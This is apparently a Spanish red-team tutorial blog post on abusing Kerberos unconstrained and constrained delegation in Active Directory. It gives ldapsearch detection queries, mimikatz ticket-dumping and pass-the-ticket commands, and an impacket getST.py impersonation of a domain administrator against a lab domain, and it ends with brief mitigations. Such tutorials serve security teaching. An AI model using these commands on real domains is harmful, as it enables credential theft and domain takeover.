---
layout: post2
language: es
title:  "Kerberos: Delegaciones"
categories:  es Kerberos Delegaciones
tags: [ "Red Team", "AD", "Delegaciones"]
---

## Índice
---
1. [Unconstrained delegation](#unconstrained-delegation)
	1. [Como detectar la caracteristica.](#como-detectar-la-caracteristica)
	2. [Como abusar de Unconstrained Delegation](#como-abusar-de-unconstrained-delegation)
2. [Constrained delegation](#constrained-delegation)
	1. [Como detectar constrained delegation](#como-detectar-constrained-delegation)
	2. [Como abusar de Constrained Delegation](#como-abusar-de-constrained-delegation)
4. [Resource-based constrained delegations (RBCD)](#resource-based-constrained-delegation)
	1. [RBCD sin posibilidad de usar *ServicePrincipalName* (SPN)](#rbcd-sin-spn)
5. [Posibles mitigaciones](#posibles-mitigaciones)

---

# Kerberos: Delegaciones

Las delegaciones es una caracterisitca que tienen los entornos de directorio activo de windows, su implementacion tiene la funcion de que un servicio pueda realizar acciones en nombre de un usuario que se halla autenticado en dicho servicio. Por ejemplo, si un servidor web con autenticación, *Kerberos*, tiene una funcionalidad de subida de fichero, la cual se realiza en un servidor de ficheros, para poder hacer que el servicio web pueda realizar acciones en nombre del usuario autenticado, en el servidor de ficheros, utiliza las delegaciones de windows.    
 
<p align="center">
   <img src="/assets/img/delegacion.png">
</p>

 
Una mala configuración de esta característica puede hacer que un usuario pueda realizar acciones en nombre de otros usuarios sin el consentimiento de estos mismos. Existen tres tipos de Abusos de dicha cualidad. **Unconstrained delegation**, **Constrained delegation**, **Resource- base constrained delegation(RBCD)**
<br>

---

1. ## Unconstrained delegation

En este caso la delegación permite que el usuario pueda impersonar a cualquier usuario que haya logueado en el servicio, esto es por que se almacena una copia del TGT al realizar la autenticación, esto permite que puedan generarse TGS en su nombre para ser utilizados en otros servios, por lo que si se consigue realizar con exito, y existe una copia del TGT de un administrador de dominio en el equipo podría utilizarse para realizar acciones como *DCsync* en nombre de dicho administrador de dominio.

Esto es debido a el servicio que pose la característica *SeEnableDelegation* activa, que se consigue activando la opción *Confiar en este equipo para la delegación a cualquier servicio (solo Kerberos)*

<p align="center">
   <img src="/assets/img/SeEnableDelegation.png">
</p>


Esto modifica el *userAccountControl* y añade la opción *TrustedForDelegation* que permite aprovecharnos de esta delegación.

<p align="center">
   <img src="/assets/img/TrustedForDelegation.png">
</p>



   1. ### Como detectar la característica

Para detectar la vulnerabilidad mediante ldap search necesitamos, y debemos filtrar por maquinas y por el valor *524288* en el *userAccountControl*. Un ejemplo de petición sería.
```ladpsearch
ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "ldap://dc01.brain.body" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
```

A lo que aparecerá una lista con las maquinas que tienen activadas esta funcionalidad

<p align="center">
   <img src="/assets/img/Uncosldapsearch.png">
</p>

Impacket tine la tool `findDelegation` que nos muestra todos las delegaciones en el dominio siempre que tengamos credenciales

<p align="center">
   <img src="/assets/img/uncdimpa.png">
</p>


   2. ### Como abusar de Unconstrained Delegation
  
En nuestro caso, vemos que el equipo con nombre `WINDOWS10` tiene el el atributo `userAccounControl` con el valor `524288` como vimos con el comando anterior de `ldapsearch`.

Para explotarlo usaremos un usuario del cual tenemos credenciales y sin privilegios elevados, `retard`
<p align="center">
   <img src="/assets/img/userlp.png">
</p>

Para aprovechar esta vulnerabilidad usaremos [mimikat](https://github.com/gentilkiwi/mimikatz) este software nos dejara, una vez dentro del equipo, listar los TGT dentro de la maquina, y como tiene `unconstrained` podremos coger uno de estos tickets para usarlo en nuestro beneficio.

Para `dumpear` los tickets dentro del equipo usamos `mimikatz.exe "privielge::debug" "sekurlsa::ticekts /export" "exit"` de hay cogemos el que nos interesa, en este caso el de un admin que tenga sesion en el DC01 DC01, y lo usamos con impacket en nuestra maquina.
<p align="center">
   <img src="/assets/img/mimiadmins.png">
</p>
El usuario `acapaz` es domain admin del dominios
<p align="center">
   <img src="/assets/img/acapaz.png">
</p>

Con este TGT podremos hace acciones como si fuéramos el, para usarlo podemos usar mimikatz, usando `kerberos::ppt` y la ruta dek tgt
<p align="center">
   <img src="/assets/img/tgtacapaz.png">
</p>
Con esto ya tendremos permisos para  hacer acciones sobre el dc `10.10.10.33` en este caso
<p align="center">
   <img src="/assets/img/dcdir.png">
</p>

2. ## Constrained delegation

Esta delegación es necesario tener una cuneta de usuario o cuenta maquina, comprometida y con Service Principal Name(SPN), ademas debe tener el atributo `UserAccountControl` con el valor `TRUSTED_TO_AUTH-FOR_DELEGATION` en el parámetro `mds-allowedtodelegatoto` aparecerá el nombre del servicio y la maquina sobre la que se tiene la opción de delegar.

Además se necesita una cuenta conq la opción de `confiar en este equipo para la delegación sólo a los servicios especificados`, dependiendo de los servicios que tenga delegado se podrán realizar diferentes acciones.

Aquí una lista de algunos de los servicios y ejemplos de acciones que podría realizar un usuario con dichos permisos:
- cifs:
- host:
- ldap:
- http:
- time:
- wmi:

Con esto podemos impersonar a cualquier usuario, incluido a los administradores de dominio, dentro de la maquina *vulnerable*

  1. ### Como detectar la característica constrained delegation

Para detectar la vulnerabilidad mediante ldap search necesitamos, primero conocer si el usuario que tenemos vulnerado tiene SPN para ello realizaremos una consulta con ldap similar a esta, 
```ladpsearch
`ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "ldap://dc01.brain.body" "(&(objectCategory=user) (sAMAccountName=constraineduseser))"
```

<p align="center">
   <img src="/assets/img/userconst.png">           <img src="/assets/img/userconstconf.png">
</p>
Luego debemos filtrar por las cuentas con el `msds-allowedtodelegateto` con contenido, para ello podemos realizar la siguiente consulta ldap, en la que veremos al usuarios con la configuración del SPN que luego delegará la maquina victima.

```ladpsearch
ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "ldap://dc01.brain.body" "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"
```

<p align="center">
   <img src="/assets/img/constrainmachine.png">
</p>

  
  2. ### Como abusar de Constrained Delegation
  
En nuestro caso, vemos que el equipo con nombre `WINDOWS10` tiene el el atributo `msds-allowedtodelegateto` con el valor `cifs/brain.body` y el usuario `constraineduseser` tiene el  `msDS-AllowedToDelegateTo` hacia el servicio *cifs* de la maquina *Windows10* como vimos con el comando anterior de `ldapsearch`.

Para poder abusar de esto usaremos `impacket` la tool `getST.py` nos generará un TGS impersonando al usuario `administrador` para el servicio cifs de la maquina `Windows10`

```command
getST.py -spn cifs/Windows10.brain.body -impersonate administrador brain.body/constraineduseser:Marzo,24`
```

Después solo habrá que utilizar el ticket generado para impersonar el usuario, con el servicio `cifs` podremos, por ejemplo, listar la maquina como si fuéramos el administrador del dominio

```command
export KRB5CCNAME=$HOME/administrador.ccache
smbclient.py -k -no-pass windows10.brain.body
use C$
```

<p align="center">
   <img src="/assets/img/ConstrainedDelegation.png">
</p>
En el caso de que no se pueda delegar en dicha cuenta, por que tenga la opción `La cuenta es importante y no se puede delegar`aparecerá el siguiente error
<p align="center">
   <img src="/assets/img/delegationnotallowed.png">
</p>
Mediante esta consulta de ldap, se puede comprobar si la cuenta es delegable o no comprobando si el `UserAccountControl` tiene el siguiente valor `1048576` de la siguiente forma:

```ladpsearch
ldapsearch -v -x -D "User@brain.body" -w contraseña -b "DC=brain,DC=body" -H "ldap://dc01.brain.body" "(&(objectCategory=user)(useraccountcontrol:1.2.840.113556.1.4.803:=1048576))"
```


4. ## Resource-based constrained delegation 
	1. ### RBCD sin SPN
5. ## Posibles mitigaciones

Para evitar ser objetivo de este tipo de ataques es importante deshabilitar las delegaciones siempre que sea posible, en caso de que sea necesario seria recomendable revisar que usuarios poseen permisos para realizar estas delegaciones evitando que lo posean usuarios que no vayan a utilizarlo. Además se debería es habilitar la opción `La cuenta es importante y no se puede delegar` para las cuentas que tienen privilegios elevados

<p align="center">
   <img src="/assets/img/importante.png">
</p>



---

<br>
## References
- *https://attl4s.github.io/assets/pdf/You_do_(not)_Understand_Kerberos_Delegation.pdf*a
- *https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation*
- *https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/*
 


## Agradecimientos
- [Mario Bartolome](https://github.com/MarioBartolome) - *Por la incansable ayuda e inspiración* 
